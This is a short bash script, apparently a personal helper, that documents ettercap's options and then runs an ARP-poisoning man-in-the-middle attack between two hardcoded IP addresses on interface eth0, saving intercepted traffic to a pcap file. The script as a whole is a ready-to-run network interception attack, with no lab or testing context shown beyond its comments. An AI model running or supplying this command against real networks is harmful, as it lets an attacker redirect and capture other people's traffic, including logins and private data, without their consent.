#!/bin/bash

# Usage: ettercap [OPTIONS] [TARGET1] [TARGET2] (TARGET is in the format MAC/IP/IPv6/PORTs)
# params:
# -T use text only GUI
#       -s [CMD] issue these commands to the GUI
#       -q do not display packet contents
# -w write results to file
# -i use this network interface
# -M <METHOD:ARGS> perfrom mitm attack  
#       <arp:remote> This method implements the ARP poisoning mitm attack. The parameter "remote" 
#       is optional and you have to specify it if you want to sniff remote ip address poisoning a gateway.
# 


TARGET1=123.100.10.1
TARGET2=123.100.20.1

ettercap -T -w mitm.pcap -i eth0 -M arp /123.100.10.1// /123.100.20.1//